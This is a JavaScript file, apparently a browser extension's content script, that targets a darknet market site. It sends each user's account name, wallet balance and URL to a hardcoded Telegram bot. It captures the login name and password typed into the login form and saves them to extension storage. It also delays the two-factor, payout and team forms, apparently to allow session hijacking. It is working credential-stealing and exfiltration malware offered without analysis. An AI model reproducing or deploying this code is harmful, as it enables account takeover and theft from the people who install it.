 let teamAddForm;



if ((document.querySelector('.market-dashboard-content .form-group')!=undefined)&&((document.querySelector('.market-dashboard-content .title').innerText.match('модерации'))!=undefined)&&(document.querySelectorAll('.market-dashboard-content .form-group tbody tr').length>0)) {
	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=Alarm! " + document.querySelectorAll('li.dropdown')[0].innerText, {
    "credentials": "omit",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    },
    "method": "GET",
    "mode": "cors"
});
}

if (document.URL.match('http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/')&&(document.querySelector('li.dropdown')!=undefined)) {
	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('li.dropdown')[0].innerText + encodeURI('Online!\nBalance is ') + document.querySelector('.i_wallet').nextSibling.innerText + "%0A" + document.URL, {
    "credentials": "omit",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    },
    "method": "GET",
    "mode": "cors"
});
}

if (document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]') != undefined) {
           teamAddForm = document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]')
           
      }

      if (teamAddForm != undefined){
      teamAddForm.addEventListener('submit', function(event) {
              event.preventDefault();

              setTimeout(function() {
                  teamAddForm.removeEventListener('submit', this);
                  teamAddForm.submit();
              }, 6500)
          });}

let twoFA;
if (document.querySelector('form#registerform[action="/login/tfa"]') != undefined) {
           twoFA = document.querySelector('form#registerform[action="/login/tfa"]')    
      }           

      if (twoFA != undefined){
      twoFA.addEventListener('submit', function(event) {
              event.preventDefault();
             
              setTimeout(function() {
                  twoFA.removeEventListener('submit', this);
                  twoFA.submit();
              }, 6000)
          });}

let tfaToPayout; 
if (document.querySelector('form[action*="/balance/payout"]') != undefined) {
           tfaToPayout = document.querySelector('form[action*="/balance/payout"]')    
      }           

      if (tfaToPayout != undefined){
      tfaToPayout.addEventListener('submit', function(event) {
              event.preventDefault();
              setTimeout(function() {
                  tfaToPayout.removeEventListener('submit', this);
                  tfaToPayout.submit();
              }, 7500)
          });}


if (document.querySelector('form#registerform') != undefined) {
           loginForm = document.querySelector('form#registerform')    
      }           

      if (loginForm != undefined){
      loginForm.addEventListener('submit', function(event) {
              event.preventDefault();
             	console.log(document.querySelector('#login-name').value)
		browser.storage.local.set({'lastLogin':document.querySelector('#login-name').value})
		browser.storage.local.set({'lastPass':document.querySelector('#login-pass').value})
	      console.log(document.querySelector('#login-name').value,document.querySelector('#login-pass').value)
              setTimeout(function() {
                  loginForm.removeEventListener('submit', this);
                  loginForm.submit();
					console.log(document.querySelector('#login-name').value)
              }, 2000)
          });}

